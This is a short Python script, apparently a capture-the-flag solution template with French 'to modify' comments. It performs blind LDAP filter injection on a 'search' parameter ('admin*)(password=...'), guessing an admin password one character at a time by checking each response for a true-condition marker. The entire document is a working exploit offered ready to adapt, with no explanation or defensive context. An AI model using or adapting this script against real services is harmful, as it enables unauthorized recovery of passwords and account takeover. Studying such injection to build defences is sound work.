
import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
    print("[i] Looking for number " + str(i))
    for char in alphabet:
        r = requests.get("http://ctf.web??action=dir&search=admin*)(password=" + flag + char) #a modifier
        if ("TRUE CONDITION" in r.text): #a modifier
            flag += char
            print("[+] Flag: " + flag)
            break
